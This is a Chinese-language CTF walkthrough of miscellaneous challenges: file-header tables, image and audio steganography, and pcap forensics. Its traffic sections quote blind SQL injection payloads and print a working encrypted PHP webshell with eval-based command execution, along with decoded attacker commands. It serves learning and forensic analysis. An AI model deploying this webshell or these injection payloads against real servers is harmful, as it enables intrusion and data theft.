---
layout: about
category: about
wrench: 2022-09-07
toc: true
Researchname: CTF - 杂项
author: Bin4xin
permalink: /about/CTF-Misc-WalkThrough/
desc: 「CTF」
---

# 零：Misc

## 文件隐写

### # 0x00 格式文件参考

{: .table}
|文件格式/头尾值 |
| :---  |
| RAR Archive (rar)/文件头：52617221 |
| Wave (wav)/文件头：57415645 |
| JPEG (jpg)/文件头：FFD8FF |
| PNG (png)/文件头：89504E47 文件尾：0000000049454E44AE426082 |
| GIF (gif)/文件头：47494638 |
| ZIP Archive (zip)/文件头：504B0304 文件尾：00000000 |
| TIFF (tif)/文件头：49492A00 |
| Windows Bitmap (bmp)/文件头：424D |
| CAD (dwg)/文件头：41433130 |
| Adobe Photoshop (psd)/文件头：38425053 |
| Rich Text Format (rtf)/文件头：7B5C727466 |
| XML (xml)/文件头：3C3F786D6C |
| HTML (html)/文件头：68746D6C3E |
| Email thorough only - (eml)/文件头：44656C69766572792D646174653A |
| Outlook Express (dbx)/文件头：CFAD12FEC5FD746F |
| Outlook (pst)/文件头：2142444E |
| MS Word/Excel (xls.or.doc)/文件头：D0CF11E0 |
| MS Access (mdb)/文件头：5374616E64617264204A |
| WordPerfect (wpd)/文件头：FF575043 |
| Adobe Acrobat (pdf)/文件头：255044462D312E |
| Quicken (qdf)/文件头：AC9EBD8F |
| Windows Password (pwl)/文件头：E3828596 |
| AVI (avi)/文件头：41564920 |
| Real Audio (ram)/文件头：2E7261FD |
| Real Media (rm)/文件头：2E524D46 |
| MPEG (mpg)/文件头：000001BA |
| MPEG (mpg)/文件头：000001B3 |
| Quicktime (mov)/文件头：6D6F6F76 |
| Windows Media (asf)/文件头：3026B2758E66CF11 |
| MIDI (mid)/文件头：4D546864 |

### # 0x01 图片隐写

- 题目1：word的本质

根据题目标题和附件，猜测可能和word文件格式的后缀相关；给出的文件是[word的本质的附件.docx](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CTF/MISC/word的本质的附件.docx)

给出一份word文档可以打开，内容如下：
![C2gG5InSMyzT1tU.png](https://image.yjs2635.xyz/images/2022/02/20/C2gG5InSMyzT1tU.png)

老规矩，`binwalk`查看一下文件
```bash
➜ binwalk word的本质的附件.docx

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v1.0 to extract, name: _rels/
···
8139          0x1FCB          Zip archive data, at least v1.0 to extract, compressed size: 31149, uncompressed size: 31149, name: word/media/image1.jpg
39339         0x99AB          Zip archive data, at least v1.0 to extract, compressed size: 19960, uncompressed size: 19960, name: word/media/image2.png
···
105465        0x19BF9         End of Zip archive, footer length: 22
```
看到是zip文件，直接`➜ mv word的本质的附件.docx word的本质的附件.zip`，然后解压得到flag；`image1.jpg`是上面文档中的图片：

![2JmebUsQ3FkrnDz.png](https://image.yjs2635.xyz/images/2022/02/20/2JmebUsQ3FkrnDz.png)

- 题目2：简单的图片

[简单的图片的附件.zip](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CTF/MISC/简单的图片的附件.zip)
```bash
➜  binwalk 简单的图片的附件.zip
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 1214015, uncompressed size: 1226323, name: 2.png
1214050       0x128662        Zip archive data, at least v2.0 to extract, compressed size: 1008239, uncompressed size: 1008124, name: 1.png
2222498       0x21E9A2        End of Zip archive, footer length: 22
```
zip压缩包可以直接解压出两张看起来一摸一样的图片；同样的：使用`binwalk`分别查看一下两张图片：
```bash
➜ binwalk 1.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1080 x 720, 8-bit/color RGB, non-interlaced
179           0xB3            Zlib compressed data, best compression
310064        0x4BB30         MySQL MISAM compressed data file Version 11

➜ binwalk 2.png

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1080 x 720, 8-bit/color RGB, non-interlaced
```
注意到`MySQL MISAM compressed data file Version 11`这一段，不知道是啥，全部提取出来康康：`➜ binwalk --dd=".*" 1.png`
```bash
➜ ll
total 9880
drwxr-xr-x  6 bin4xin  staff      192  8 19 10:01 ./
drwx------  8 bin4xin  staff      256  8 19 09:49 ../
-rw-r--r--  1 bin4xin  staff  1008124  8 19 09:49 0
-rw-r--r--@ 1 bin4xin  staff   698060  8 19 09:49 4BB30
-rw-r--r--  1 bin4xin  staff  2333520  8 19 09:49 B3
-rw-r--r--  1 bin4xin  staff  1007945  8 19 09:49 B3.zlib

➜ file 4BB30
4BB30: MySQL MyISAM index file Version 11, 50404 key parts, 19163 unique key parts, 111 keys, 1846990095656532900 records, 1063746735895758743 deleted records
```
[查了查资料](https://www.jianshu.com/p/2ea6d3b98ff5)是Mysql的存储文件，但是需要[三个单独(.FRM /.MYD /.MYI)的文件](https://blog.csdn.net/qq_42352175/article/details/86097931)才能查看mysql的数据，但是我们只有`.MYI`的文件。

然后就这样一直卡着；直到看了解题思路：

- 盲水印
    - [解题工具BlindWaterMark](https://github.com/chishaxie/BlindWaterMark)
    - 实测两张图片调整顺序不会影响最终结果：

```bash
$ python bwm.py decode 2.png 1.png Result-1.png
$ python bwm.py decode 1.png 2.png Result-2.png
```

![K8iPZ4nfgSoXeOW.png](https://image.yjs2635.xyz/images/2022/02/20/K8iPZ4nfgSoXeOW.png)


所以，如果遇到两张相同的图的题目没有思路，可以往盲水印考点上来靠靠。

- 题目3：简单隐写，给出的是一张png图片：[简单隐写的附件.png](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CTF/MISC/简单隐写的附件.png)

> *Tips:* 最近做其他题目思路顺手看了一下发现url不存在，应该是当时没传上去；找到文件附件在修改链接

打开是一张空白的图片，高宽1195x1195

![PNmI4eyWxO1r8ZG.png](https://image.yjs2635.xyz/images/2022/02/20/PNmI4eyWxO1r8ZG.png)

### # 0x02 音频隐写

- 题目：[去吧！追寻自由的电波](https://github.com/USTC-Hackergame/hackergame2021-writeups/blob/master/official/%E5%8E%BB%E5%90%A7%EF%BC%81%E8%BF%BD%E5%AF%BB%E8%87%AA%E7%94%B1%E7%9A%84%E7%94%B5%E6%B3%A2/src/radio.mp3)
    - [题解](https://github.com/USTC-Hackergame/hackergame2021-writeups/tree/master/official/%E5%8E%BB%E5%90%A7%EF%BC%81%E8%BF%BD%E5%AF%BB%E8%87%AA%E7%94%B1%E7%9A%84%E7%94%B5%E6%B3%A2)；
    - 使用Audacity减慢播放速度即可。

## 流量分析（.pacp）题

### # 0x03 SQL注入攻击

- [timu.pcapng](https://github.com/Bin4xin/bigger-than-bigger/tree/master/CTF/MISC/timu.pcapng)

打开显示为注入payload`id=1' and ascii(substr((select flag from t),1,1))=33--`，是使用二分法判断SQL语句执行对应的Ascii字符是否相等：

![hup13CgkwsoTVRa.png](https://image.yjs2635.xyz/images/2022/02/20/hup13CgkwsoTVRa.png)

所以直接来看一下返回包的页面是否有不同的地方：`Analyze->Follow->TCP/HTTP Stream`

![mgI9SUcGn4OLPTu.png](https://image.yjs2635.xyz/images/2022/02/20/mgI9SUcGn4OLPTu.png)

两边不同显示：左边为错误Ascii，右边为正确的Ascii，按照顺序`(substr((select flag from t),1,1)->(n,1)`得到：

```bash
GET /ctf/Less-5/?id=1' and ascii(substr((select flag from t),1,1))=102--  HTTP/1.1
GET /ctf/Less-5/?id=1' and ascii(substr((select flag from t),2,1))=108--  HTTP/1.1
GET /ctf/Less-5/?id=1' and ascii(substr((select flag from t),3,1))=97--  HTTP/1.1
GET /ctf/Less-5/?id=1' and ascii(substr((select flag from t),4,1))=103--  HTTP/1.1
···
```

查一下[Ascii字母表](https://blog.csdn.net/Lucky_bo/article/details/52247939)

得到flag：

```bash
102 108 97 103 123 119 49 114 101 115 104 65 82 75 95 101 122 95 49 115 110 116 105 116 125

#-> flag{w1reshARK_ez_1snt}
```

### # 0x04 [...]usb流量分析

[...]

### # 0x05 取证/攻击行为

- 无题目描述；给出的是一份流量文件：[backdoor.pcapng](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CTF/MISC/backdoor/backdoor.pcapng)

打开一看映入眼帘的是一系列SQL注入的payload：

- `File -> Export Objects -> HTTP`

![yPQAJtCO2LIVT8W.png](https://image.yjs2635.xyz/images/2022/02/20/yPQAJtCO2LIVT8W.png)

导出几个出来看看，得到一些数据库的信息：

![j7mBCryiQ1SONfh.png](https://image.yjs2635.xyz/images/2022/02/20/j7mBCryiQ1SONfh.png)

往下就是`Login.php POST包`登录成功的信息：
```bash
POST /login.php HTTP/1.1
···
username=admin&password=mysql&button=SIGN-IN
HTTP/1.1 302 Found
Location: ./admin/index.php
```
接着往下，获取到了一些有用的信息，流量显示`Upload.php`Post上传成功了一个php马：
```php
<?php
    session_start();
    @set_time_limit(0);
	@error_reporting(0);
    function E($D,$K){
        for($i=0;$i<strlen($D);$i++) {
            $D[$i] = $D[$i]^$K[$i+1&15];
        }# E函数为异或加密
        return $D;
    }
    function Q($D){
        return base64_encode($D);
    }# Q函数为base64编码
    function O($D){
        return base64_decode($D);
    }# O函数为base64解码
    $P='pass'; # 木马连接参数
    $V='payload'; # 执行载荷
    $T='3c6e0b8a9c15224a'; # 加密密钥
    if (isset($_POST[$P])){
        $F=O(E(O($_POST[$P]),$T));
        if (isset($_SESSION[$V])){
            $L=$_SESSION[$V];
            $A=explode('|',$L);
            class C{public function nvoke($p) {eval($p."");}}
            $R=new C();
			$R->nvoke($A[0]);
            echo substr(md5($P.$T),0,16);
            echo Q(E(@run($F),$T));
            echo substr(md5($P.$T),16);
        }else{
            $_SESSION[$V]=$F;
        }
    }
#/upload/1615384904.php 上传成功，为1615384904.php
```
- 那么我们只需要关注`1615384904.php`攻击者操作木马进行了哪些操作就好；全部导出，操作流量全加密类似请求POST：

```
pass=OgRUWzZ%2FDUw5ZQRbYXFQfylbVFwGfwlPOXQAWlBjNAo0Wg1fAH4KTjdfb1tkTidcOltUYjJpXAQ%3D
```

- 返回：

```
11cd6a8758984163LmIwSi9SBgguZXwBfFkRSQEEUXsvbDRDLltSA39gKAYtdVBHA3Agci5lYEh/XgYCLmIoSCxRVE4CeXR5f2A4Sy1iKAQsfApOLXIARVN8IHg=6c37ac826a2a04bc
```

- 查看代码逻辑：`post传入参数pass`->`$T密钥加密`->`$V传入class C`进而传入eval函数进行命令执行，所以我们下一步需要做的是破解木马的加密方式，[解密代码](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CTF/MISC/backdoor/jiemi.php){:target="_blank"}
    - 解得上面的POST请求为：
    - 返回：

```bash
#cmdLine=bHMK&methodName=ZXhlY0NvbW1hbmQ= -> base64decode ->cmdLine=ls&methodName=execCommand
1532851276json       1532851294.php       1532851316.php       1615384904.php
```

- 进一步分析得到备份命令：

```bash
cmdLine=zip www.zip -rP $APACHE_RUN_USER /var/www/html/&methodName=execCommand
```

- 从流量文件中找到`www.zip`导出，解压密码是`$APACHE_RUN_USER`
- 也是从流量中执行`env`命令`cmdLine=ZW52Cg==&methodName=ZXhlY0NvbW1hbmQ=`解密得到：

```
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/app/admin/upload
```

所以密码就是`www-data`，然后根据http流量包把zip文件解压出来，我们找到下载zip文件流量包的反包：

`选择反包->文件->Export packet Bytes/导出数据包字节流`

[![2022-09-07-11.27.33.png](https://image.yjs2635.xyz/images/2022/09/07/2022-09-07-11.27.33.png)](https://image.yjs2635.xyz/image/GT2l)

解压zip文件，html目录下php代码发现`flag.php`：

```php
<?php
$enc = 'aes-128-ecb';
$flag = 'CN1Sq9tFItxZhsu3zCWbrdf6ozOL4eoKG0s71vGg/AKKnch3IL3jzwtXeCgWK5QP';
?>
```

观察目录下发现存在被修改的php代码：（以下为参考教程给出-。-）

![uUHT3GLDnqiRYtw.png](https://image.yjs2635.xyz/images/2022/02/20/uUHT3GLDnqiRYtw.png)

使用后加的代码对空白字符进行解码，并`file_put_contents('tmp2.txt',base64_decode($out));`输出到`tmp2.txt`文件中，同样文件中输出也有空白字符，再次解码即可；

![aL9SKwjU2bytBqH.png](https://image.yjs2635.xyz/images/2022/02/20/aL9SKwjU2bytBqH.png)

[解码代码](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CTF/MISC/backdoor/kongbai-jiemi.php){:target="_blank"}

![7RVMhvliOXIfoZJ.png](https://image.yjs2635.xyz/images/2022/02/20/7RVMhvliOXIfoZJ.png)

使用获得的key[在线解密](http://tool.chacuo.net/cryptaes){:target="_blank"}`aes-128-ecb`算法，得到flag：`DASCTF{d8f191d0f0be0f039c4ededb7839218e}`

### # 0x06 [...]上传/下载文件

[...]